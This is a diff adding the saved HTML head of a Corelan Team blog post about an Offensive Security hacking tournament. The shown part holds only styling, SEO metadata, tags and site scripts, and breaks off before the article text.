@@ -1,0 +1,2218 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" prefix="og: https://ogp.me/ns#" class="gecko linux" lang="en-US"><link type="text/css" rel="stylesheet" id="dark-mode-general-link" class="joplin-clipper-hidden"><link type="text/css" rel="stylesheet" id="dark-mode-custom-link" class="joplin-clipper-hidden"><style type="text/css" id="dark-mode-custom-style" class="joplin-clipper-hidden"></style><head profile="http://gmpg.org/xfn/11" class="joplin-clipper-hidden">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
+<title>Offensive Security Hacking Tournament – How strong was my fu ? | Corelan Team</title>
+<link rel="stylesheet" href="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/style.css" type="text/css" media="screen">
+<!--[if IE 6]><link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.ie6.css" type="text/css" media="screen" /><![endif]-->
+<!--[if IE 7]><link rel="stylesheet" href="https://www.corelan.be/wp-content/themes/corelan/style.ie7.css" type="text/css" media="screen" /><![endif]-->
+<link rel="pingback" href="https://www.corelan.be/xmlrpc.php">
+<style>
+.stb-container-css {margin: 10px 10px 10px 10px;}.stb-box {}.stb-caption-box {}.stb-body-box {}
+/* Class Dependent Parameters */
+.stb-border.stb-alert-container {border: 1px solid #FF4F4A;}.stb-side.stb-alert-container {background: #1D1A1A;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#1D1A1A', endColorstr='#504848',GradientType=0 );background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);}.stb-side-none.stb-alert-container {background: #fDCBC9;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#fDCBC9', endColorstr='#FB7D78',GradientType=0 );background: -moz-linear-gradient(top,  #fDCBC9 30%, #FB7D78 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#fDCBC9), color-stop(90%,#FB7D78));background: -webkit-linear-gradient(top,  #fDCBC9 30%,#FB7D78 90%);background: -o-linear-gradient(top,  #fDCBC9 30%,#FB7D78 90%);background: -ms-linear-gradient(top,  #fDCBC9 30%,#FB7D78 90%);background: linear-gradient(#fDCBC9 30%, #FB7D78 90%);}.stb-alert_box {background: #fDCBC9;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#fDCBC9', endColorstr='#FB7D78',GradientType=0 );background: -moz-linear-gradient(top,  #fDCBC9 30%, #FB7D78 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#fDCBC9), color-stop(90%,#FB7D78));background: -webkit-linear-gradient(top,  #fDCBC9 30%,#FB7D78 90%);background: -o-linear-gradient(top,  #fDCBC9 30%,#FB7D78 90%);background: -ms-linear-gradient(top,  #fDCBC9 30%,#FB7D78 90%);background: linear-gradient(#fDCBC9 30%, #FB7D78 90%);color: #000000;}.stb-alert-caption_box {background: #1D1A1A;background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);color: #FFFFFF;}.stb-alert-body_box {background: #fDCBC9;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#fDCBC9', endColorstr='#FB7D78',GradientType=0 );background: -moz-linear-gradient(top,  #fDCBC9 30%, #FB7D78 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#fDCBC9), color-stop(90%,#FB7D78));background: -webkit-linear-gradient(top,  #fDCBC9 30%,#FB7D78 90%);background: -o-linear-gradient(top,  #fDCBC9 30%,#FB7D78 90%);background: -ms-linear-gradient(top,  #fDCBC9 30%,#FB7D78 90%);background: linear-gradient(#fDCBC9 30%, #FB7D78 90%);color: #000000;}.stb-border.stb-black-container {border: 1px solid #6E6E6E;}.stb-side.stb-black-container {background: #4B4747;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#4B4747', endColorstr='#141414',GradientType=0 );background: -moz-linear-gradient(top,  #4B4747 30%, #141414 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#4B4747), color-stop(90%,#141414));background: -webkit-linear-gradient(top,  #4B4747 30%,#141414 90%);background: -o-linear-gradient(top,  #4B4747 30%,#141414 90%);background: -ms-linear-gradient(top,  #4B4747 30%,#141414 90%);background: linear-gradient(#4B4747 30%, #141414 90%);}.stb-side-none.stb-black-container {background: #3B3B3B;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#3B3B3B', endColorstr='#000000',GradientType=0 );background: -moz-linear-gradient(top,  #3B3B3B 30%, #000000 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#3B3B3B), color-stop(90%,#000000));background: -webkit-linear-gradient(top,  #3B3B3B 30%,#000000 90%);background: -o-linear-gradient(top,  #3B3B3B 30%,#000000 90%);background: -ms-linear-gradient(top,  #3B3B3B 30%,#000000 90%);background: linear-gradient(#3B3B3B 30%, #000000 90%);}.stb-black_box {background: #3B3B3B;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#3B3B3B', endColorstr='#000000',GradientType=0 );background: -moz-linear-gradient(top,  #3B3B3B 30%, #000000 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#3B3B3B), color-stop(90%,#000000));background: -webkit-linear-gradient(top,  #3B3B3B 30%,#000000 90%);background: -o-linear-gradient(top,  #3B3B3B 30%,#000000 90%);background: -ms-linear-gradient(top,  #3B3B3B 30%,#000000 90%);background: linear-gradient(#3B3B3B 30%, #000000 90%);color: #FFFFFF;}.stb-black-caption_box {background: #4B4747;background: -moz-linear-gradient(top,  #4B4747 30%, #141414 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#4B4747), color-stop(90%,#141414));background: -webkit-linear-gradient(top,  #4B4747 30%,#141414 90%);background: -o-linear-gradient(top,  #4B4747 30%,#141414 90%);background: -ms-linear-gradient(top,  #4B4747 30%,#141414 90%);background: linear-gradient(#4B4747 30%, #141414 90%);color: #FFFFFF;}.stb-black-body_box {background: #3B3B3B;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#3B3B3B', endColorstr='#000000',GradientType=0 );background: -moz-linear-gradient(top,  #3B3B3B 30%, #000000 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#3B3B3B), color-stop(90%,#000000));background: -webkit-linear-gradient(top,  #3B3B3B 30%,#000000 90%);background: -o-linear-gradient(top,  #3B3B3B 30%,#000000 90%);background: -ms-linear-gradient(top,  #3B3B3B 30%,#000000 90%);background: linear-gradient(#3B3B3B 30%, #000000 90%);color: #FFFFFF;}.stb-border.stb-download-container {border: 1px solid #65ADFE;}.stb-side.stb-download-container {background: #1D1A1A;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#1D1A1A', endColorstr='#504848',GradientType=0 );background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);}.stb-side-none.stb-download-container {background: #78C0F7;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#78C0F7', endColorstr='#2E7CB9',GradientType=0 );background: -moz-linear-gradient(top,  #78C0F7 30%, #2E7CB9 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#78C0F7), color-stop(90%,#2E7CB9));background: -webkit-linear-gradient(top,  #78C0F7 30%,#2E7CB9 90%);background: -o-linear-gradient(top,  #78C0F7 30%,#2E7CB9 90%);background: -ms-linear-gradient(top,  #78C0F7 30%,#2E7CB9 90%);background: linear-gradient(#78C0F7 30%, #2E7CB9 90%);}.stb-download_box {background: #78C0F7;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#78C0F7', endColorstr='#2E7CB9',GradientType=0 );background: -moz-linear-gradient(top,  #78C0F7 30%, #2E7CB9 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#78C0F7), color-stop(90%,#2E7CB9));background: -webkit-linear-gradient(top,  #78C0F7 30%,#2E7CB9 90%);background: -o-linear-gradient(top,  #78C0F7 30%,#2E7CB9 90%);background: -ms-linear-gradient(top,  #78C0F7 30%,#2E7CB9 90%);background: linear-gradient(#78C0F7 30%, #2E7CB9 90%);color: #000000;}.stb-download-caption_box {background: #1D1A1A;background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);color: #FFFFFF;}.stb-download-body_box {background: #78C0F7;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#78C0F7', endColorstr='#2E7CB9',GradientType=0 );background: -moz-linear-gradient(top,  #78C0F7 30%, #2E7CB9 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#78C0F7), color-stop(90%,#2E7CB9));background: -webkit-linear-gradient(top,  #78C0F7 30%,#2E7CB9 90%);background: -o-linear-gradient(top,  #78C0F7 30%,#2E7CB9 90%);background: -ms-linear-gradient(top,  #78C0F7 30%,#2E7CB9 90%);background: linear-gradient(#78C0F7 30%, #2E7CB9 90%);color: #000000;}.stb-border.stb-info-container {border: 1px solid #7AD975;}.stb-side.stb-info-container {background: #1D1A1A;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#1D1A1A', endColorstr='#504848',GradientType=0 );background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);}.stb-side-none.stb-info-container {background: #A1EA94;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#A1EA94', endColorstr='#79B06E',GradientType=0 );background: -moz-linear-gradient(top,  #A1EA94 30%, #79B06E 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#A1EA94), color-stop(90%,#79B06E));background: -webkit-linear-gradient(top,  #A1EA94 30%,#79B06E 90%);background: -o-linear-gradient(top,  #A1EA94 30%,#79B06E 90%);background: -ms-linear-gradient(top,  #A1EA94 30%,#79B06E 90%);background: linear-gradient(#A1EA94 30%, #79B06E 90%);}.stb-info_box {background: #A1EA94;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#A1EA94', endColorstr='#79B06E',GradientType=0 );background: -moz-linear-gradient(top,  #A1EA94 30%, #79B06E 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#A1EA94), color-stop(90%,#79B06E));background: -webkit-linear-gradient(top,  #A1EA94 30%,#79B06E 90%);background: -o-linear-gradient(top,  #A1EA94 30%,#79B06E 90%);background: -ms-linear-gradient(top,  #A1EA94 30%,#79B06E 90%);background: linear-gradient(#A1EA94 30%, #79B06E 90%);color: #000000;}.stb-info-caption_box {background: #1D1A1A;background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);color: #FFFFFF;}.stb-info-body_box {background: #A1EA94;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#A1EA94', endColorstr='#79B06E',GradientType=0 );background: -moz-linear-gradient(top,  #A1EA94 30%, #79B06E 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#A1EA94), color-stop(90%,#79B06E));background: -webkit-linear-gradient(top,  #A1EA94 30%,#79B06E 90%);background: -o-linear-gradient(top,  #A1EA94 30%,#79B06E 90%);background: -ms-linear-gradient(top,  #A1EA94 30%,#79B06E 90%);background: linear-gradient(#A1EA94 30%, #79B06E 90%);color: #000000;}.stb-border.stb-warning-container {border: 1px solid #FE9A05;}.stb-side.stb-warning-container {background: #1D1A1A;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#1D1A1A', endColorstr='#504848',GradientType=0 );background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);}.stb-side-none.stb-warning-container {background: #F8FC91;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#F8FC91', endColorstr='#F0D208',GradientType=0 );background: -moz-linear-gradient(top,  #F8FC91 30%, #F0D208 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#F8FC91), color-stop(90%,#F0D208));background: -webkit-linear-gradient(top,  #F8FC91 30%,#F0D208 90%);background: -o-linear-gradient(top,  #F8FC91 30%,#F0D208 90%);background: -ms-linear-gradient(top,  #F8FC91 30%,#F0D208 90%);background: linear-gradient(#F8FC91 30%, #F0D208 90%);}.stb-warning_box {background: #F8FC91;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#F8FC91', endColorstr='#F0D208',GradientType=0 );background: -moz-linear-gradient(top,  #F8FC91 30%, #F0D208 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#F8FC91), color-stop(90%,#F0D208));background: -webkit-linear-gradient(top,  #F8FC91 30%,#F0D208 90%);background: -o-linear-gradient(top,  #F8FC91 30%,#F0D208 90%);background: -ms-linear-gradient(top,  #F8FC91 30%,#F0D208 90%);background: linear-gradient(#F8FC91 30%, #F0D208 90%);color: #000000;}.stb-warning-caption_box {background: #1D1A1A;background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);color: #FFFFFF;}.stb-warning-body_box {background: #F8FC91;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#F8FC91', endColorstr='#F0D208',GradientType=0 );background: -moz-linear-gradient(top,  #F8FC91 30%, #F0D208 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#F8FC91), color-stop(90%,#F0D208));background: -webkit-linear-gradient(top,  #F8FC91 30%,#F0D208 90%);background: -o-linear-gradient(top,  #F8FC91 30%,#F0D208 90%);background: -ms-linear-gradient(top,  #F8FC91 30%,#F0D208 90%);background: linear-gradient(#F8FC91 30%, #F0D208 90%);color: #000000;}.stb-border.stb-grey-container {border: 1px solid #BBBBBB;}.stb-side.stb-grey-container {background: #B5B5B5;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#B5B5B5', endColorstr='#6E6E6E',GradientType=0 );background: -moz-linear-gradient(top,  #B5B5B5 30%, #6E6E6E 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#B5B5B5), color-stop(90%,#6E6E6E));background: -webkit-linear-gradient(top,  #B5B5B5 30%,#6E6E6E 90%);background: -o-linear-gradient(top,  #B5B5B5 30%,#6E6E6E 90%);background: -ms-linear-gradient(top,  #B5B5B5 30%,#6E6E6E 90%);background: linear-gradient(#B5B5B5 30%, #6E6E6E 90%);}.stb-side-none.stb-grey-container {background: #E3E3E3;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#E3E3E3', endColorstr='#ABABAB',GradientType=0 );background: -moz-linear-gradient(top,  #E3E3E3 30%, #ABABAB 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#E3E3E3), color-stop(90%,#ABABAB));background: -webkit-linear-gradient(top,  #E3E3E3 30%,#ABABAB 90%);background: -o-linear-gradient(top,  #E3E3E3 30%,#ABABAB 90%);background: -ms-linear-gradient(top,  #E3E3E3 30%,#ABABAB 90%);background: linear-gradient(#E3E3E3 30%, #ABABAB 90%);}.stb-grey_box {background: #E3E3E3;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#E3E3E3', endColorstr='#ABABAB',GradientType=0 );background: -moz-linear-gradient(top,  #E3E3E3 30%, #ABABAB 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#E3E3E3), color-stop(90%,#ABABAB));background: -webkit-linear-gradient(top,  #E3E3E3 30%,#ABABAB 90%);background: -o-linear-gradient(top,  #E3E3E3 30%,#ABABAB 90%);background: -ms-linear-gradient(top,  #E3E3E3 30%,#ABABAB 90%);background: linear-gradient(#E3E3E3 30%, #ABABAB 90%);color: #000000;}.stb-grey-caption_box {background: #B5B5B5;background: -moz-linear-gradient(top,  #B5B5B5 30%, #6E6E6E 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#B5B5B5), color-stop(90%,#6E6E6E));background: -webkit-linear-gradient(top,  #B5B5B5 30%,#6E6E6E 90%);background: -o-linear-gradient(top,  #B5B5B5 30%,#6E6E6E 90%);background: -ms-linear-gradient(top,  #B5B5B5 30%,#6E6E6E 90%);background: linear-gradient(#B5B5B5 30%, #6E6E6E 90%);color: #FFFFFF;}.stb-grey-body_box {background: #E3E3E3;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#E3E3E3', endColorstr='#ABABAB',GradientType=0 );background: -moz-linear-gradient(top,  #E3E3E3 30%, #ABABAB 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#E3E3E3), color-stop(90%,#ABABAB));background: -webkit-linear-gradient(top,  #E3E3E3 30%,#ABABAB 90%);background: -o-linear-gradient(top,  #E3E3E3 30%,#ABABAB 90%);background: -ms-linear-gradient(top,  #E3E3E3 30%,#ABABAB 90%);background: linear-gradient(#E3E3E3 30%, #ABABAB 90%);color: #000000;}.stb-border.stb-custom-container {border: 1px solid #F844EE;}.stb-side.stb-custom-container {background: #1D1A1A;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#1D1A1A', endColorstr='#504848',GradientType=0 );background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);}.stb-side-none.stb-custom-container {background: #F7CDF5;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#F7CDF5', endColorstr='#F77DF1',GradientType=0 );background: -moz-linear-gradient(top,  #F7CDF5 30%, #F77DF1 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#F7CDF5), color-stop(90%,#F77DF1));background: -webkit-linear-gradient(top,  #F7CDF5 30%,#F77DF1 90%);background: -o-linear-gradient(top,  #F7CDF5 30%,#F77DF1 90%);background: -ms-linear-gradient(top,  #F7CDF5 30%,#F77DF1 90%);background: linear-gradient(#F7CDF5 30%, #F77DF1 90%);}.stb-custom_box {background: #F7CDF5;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#F7CDF5', endColorstr='#F77DF1',GradientType=0 );background: -moz-linear-gradient(top,  #F7CDF5 30%, #F77DF1 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#F7CDF5), color-stop(90%,#F77DF1));background: -webkit-linear-gradient(top,  #F7CDF5 30%,#F77DF1 90%);background: -o-linear-gradient(top,  #F7CDF5 30%,#F77DF1 90%);background: -ms-linear-gradient(top,  #F7CDF5 30%,#F77DF1 90%);background: linear-gradient(#F7CDF5 30%, #F77DF1 90%);color: #000000;}.stb-custom-caption_box {background: #1D1A1A;background: -moz-linear-gradient(top,  #1D1A1A 30%, #504848 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#1D1A1A), color-stop(90%,#504848));background: -webkit-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -o-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: -ms-linear-gradient(top,  #1D1A1A 30%,#504848 90%);background: linear-gradient(#1D1A1A 30%, #504848 90%);color: #FFFFFF;}.stb-custom-body_box {background: #F7CDF5;filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#F7CDF5', endColorstr='#F77DF1',GradientType=0 );background: -moz-linear-gradient(top,  #F7CDF5 30%, #F77DF1 90%);background: -webkit-gradient(linear, left top, left bottom, color-stop(30%,#F7CDF5), color-stop(90%,#F77DF1));background: -webkit-linear-gradient(top,  #F7CDF5 30%,#F77DF1 90%);background: -o-linear-gradient(top,  #F7CDF5 30%,#F77DF1 90%);background: -ms-linear-gradient(top,  #F7CDF5 30%,#F77DF1 90%);background: linear-gradient(#F7CDF5 30%, #F77DF1 90%);color: #000000;}</style>
+
+<!-- All In One SEO Pack 3.7.0ob_start_detected [-1,-1] -->
+<meta name="description" content="Hi, Over the last 2 days my friends from Corelan Team and I participated in a Hacking Tournament, organized by Offensive Security. The primary goals of the">
+
+<meta name="keywords" content="--,001_security,192-168-6-66,capture,ctf,flag,hacking,hacklab-vpn,n00bfilter,nc-backshell-invalid-connection,nox-of-xr-offensive-security-team,offensive security,offensive-security-labs-exercises,offsec-lab,offsec-lab-firewall,pentestexploitsexploitdbplatformslinuxremote340-c-imap,screenos-import-pfx,smtx-video-ghost-challenge-write-up,surgemail-3-8k4-4-d-download,tournament,exploits">
+
+<script src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/osd.js"></script><script src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/show_ads_impl_fy2019.js" id="google_shimpl"></script><script src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/cookie.js"></script><script type="text/javascript" async="" src="Offensive%20Security%20Hacking%20Tournament%20%E2%80%93%20How%20strong%20was%20my%20fu%20%3F%20|%20Corelan%20Team_files/ga.js"></script><script type="application/ld+json" class="aioseop-schema">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://www.corelan.be/#organization","url":"https://www.corelan.be/","name":"Corelan Team","sameAs":[]},{"@type":"WebSite","@id":"https://www.corelan.be/#website","url":"https://www.corelan.be/","name":"Corelan Team","publisher":{"@id":"https://www.corelan.be/#organization"}},{"@type":"WebPage","@id":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/#webpage","url":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/","inLanguage":"en-US","name":"Offensive Security Hacking Tournament - How strong was my fu ?","isPartOf":{"@id":"https://www.corelan.be/#website"},"breadcrumb":{"@id":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/#breadcrumblist"},"datePublished":"2010-05-10T21:20:00+02:00","dateModified":"2015-03-15T21:44:15+01:00"},{"@type":"Article","@id":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/#article","isPartOf":{"@id":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/#webpage"},"author":{"@id":"https://www.corelan.be/index.php/author/admin1/#author"},"headline":"Offensive Security Hacking Tournament &#8211; How strong was my fu ?","datePublished":"2010-05-10T21:20:00+02:00","dateModified":"2015-03-15T21:44:15+01:00","commentCount":18,"mainEntityOfPage":{"@id":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/#webpage"},"publisher":{"@id":"https://www.corelan.be/#organization"},"articleSection":"001_Security, Exploits, --, 001_Security, 192-168-6-66, capture, ctf, flag, hacking, hacklab-vpn, n00bfilter, nc-backshell-invalid-connection, nox-of-xr-offensive-security-team, offensive security, offensive-security-labs-exercises, offsec-lab, offsec-lab-firewall, pentestexploitsexploitdbplatformslinuxremote340-c-imap, screenos-import-pfx, smtx-video-ghost-challenge-write-up, surgemail-3-8k4-4-d-download, tournament","image":{"@type":"ImageObject","@id":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/#primaryimage","url":"https://www.corelan.be/wp-content/uploads/2010/05/image_thumb43.png"}},{"@type":"Person","@id":"https://www.corelan.be/index.php/author/admin1/#author","name":"Corelan Team (corelanc0d3r)","sameAs":["corelanc0d3r"],"image":{"@type":"ImageObject","@id":"https://www.corelan.be/#personlogo","url":"https://secure.gravatar.com/avatar/c974115f14c4626034731347d72cf10f?s=96&d=mm&r=x","width":96,"height":96,"caption":"Corelan Team (corelanc0d3r)"}},{"@type":"BreadcrumbList","@id":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/#breadcrumblist","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://www.corelan.be/","url":"https://www.corelan.be/","name":"..:: Corelan Team | Peter Van Eeckhoutte (corelanc0d3r) ::.."}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/","url":"https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/","name":"Offensive Security Hacking Tournament - How strong was my fu ?"}}]}]}</script>
+<link rel="canonical" href="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Offensive Security Hacking Tournament – How strong was my fu ? | Corelan Team">
+<meta property="og:description" content="Hi, Over the last 2 days my friends from Corelan Team and I participated in a Hacking Tournament, organized by Offensive Security. The primary goals of the tournament are : be the first one to grab &amp;q">
+<meta property="og:url" content="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/">
+<meta property="og:site_name" content="Corelan Team">
+<meta property="og:image" content="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small.jpg">
+<meta property="article:published_time" content="2010-05-10T21:20:00Z">
+<meta property="article:modified_time" content="2015-03-15T21:44:15Z">
+<meta property="og:image:secure_url" content="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small.jpg">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Offensive Security Hacking Tournament – How strong was my fu ? | Corel">
+<meta name="twitter:description" content="Hi, Over the last 2 days my friends from Corelan Team and I participated in a Hacking Tournament, organized by Offensive Security. The primary goals of the tournament are : be the first one to grab &amp;q">
+<meta name="twitter:image" content="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small.jpg">
+<!-- All In One SEO Pack -->
+<link rel="dns-prefetch" href="https://s.w.org/">
+<link rel="dns-prefetch" href="https://jetpack.wordpress.com/">
+<link rel="dns-prefetch" href="https://s0.wp.com/">
+<link rel="dns-prefetch" href="https://s1.wp.com/">
+<link rel="dns-prefetch" href="https://s2.wp.com/">
+<link rel="dns-prefetch" href="https://public-api.wordpress.com/">
+<link rel="dns-prefetch" href="https://0.gravatar.com/">
+<link rel="dns-prefetch" href="https://1.gravatar.com/">
+<link rel="dns-prefetch" href="https://2.gravatar.com/">
+<link rel="alternate" type="application/rss+xml" title="Corelan Team » Feed" href="https://www.corelan.be/index.php/feed/">
+<link rel="alternate" type="application/rss+xml" title="Corelan Team » Comments Feed" href="https://www.corelan.be/index.php/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Corelan Team » Offensive Security Hacking Tournament – How strong was my fu ? Comments Feed" href="https://www.corelan.be/index.php/2010/05/10/offensive-security-hacking-tournament-how-strong-was-my-fu/feed/">
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.corelan.be\/wp-includes\/js\/wp-emoji-release.min.js?ver=b7f1c174d4c37ea8df9b952daa88ff34"}};
